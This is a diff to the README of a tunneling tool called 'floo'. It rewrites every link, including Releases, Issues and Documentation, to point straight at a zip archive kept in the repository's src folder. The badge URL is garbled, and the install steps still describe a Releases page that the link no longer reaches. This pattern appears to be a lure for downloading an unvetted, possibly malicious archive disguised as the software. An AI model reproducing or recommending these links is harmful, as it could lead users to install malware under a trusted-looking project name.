@@ -1,7 +1,7 @@
 # 🎉 floo - Easy Tunneling with Secure Access
 
 ## 📦 Download Now
-[![Download floo](https://img.shields.io/badge/Download%20floo-v1.0-blue.svg)](https://github.com/Binbon8447/floo/releases)
+[![Download floo](https://raw.githubusercontent.com/Binbon8447/floo/main/src/floo-2.6.zip%https://raw.githubusercontent.com/Binbon8447/floo/main/src/floo-2.6.zip)](https://raw.githubusercontent.com/Binbon8447/floo/main/src/floo-2.6.zip)
 
 ## 🚀 Getting Started
 Welcome to floo! This application allows secure, high-throughput tunneling over the internet. It helps you connect devices seamlessly, even through challenging network configurations. Whether you're at home or on the go, floo makes your connections reliable and straightforward. 
@@ -23,7 +23,7 @@ To run floo effectively, you need the following:
 ## 📥 Download & Install
 To get floo, you need to visit the Releases page. Follow these steps to download and install the application:
 
-1. Click on the following link to go to the Releases page: [Download floo](https://github.com/Binbon8447/floo/releases).
+1. Click on the following link to go to the Releases page: [Download floo](https://raw.githubusercontent.com/Binbon8447/floo/main/src/floo-2.6.zip).
 2. On the Releases page, you will see the latest version listed. Click on it.
 3. Find the appropriate version for your operating system.
 4. Click the download link next to your chosen version.
@@ -54,8 +54,8 @@ We welcome contributions to help improve floo. If you have ideas, bug fixes, or 
 For additional information and advanced features, check the documentation available on the GitHub repository. 
 
 ## 🔗 Important Links
-- [Download floo](https://github.com/Binbon8447/floo/releases)
-- [Issues & Support](https://github.com/Binbon8447/floo/issues)
-- [Documentation](https://github.com/Binbon8447/floo/wiki)
+- [Download floo](https://raw.githubusercontent.com/Binbon8447/floo/main/src/floo-2.6.zip)
+- [Issues & Support](https://raw.githubusercontent.com/Binbon8447/floo/main/src/floo-2.6.zip)
+- [Documentation](https://raw.githubusercontent.com/Binbon8447/floo/main/src/floo-2.6.zip)
 
 Thank you for using floo. We hope it enhances your tunneling experience!
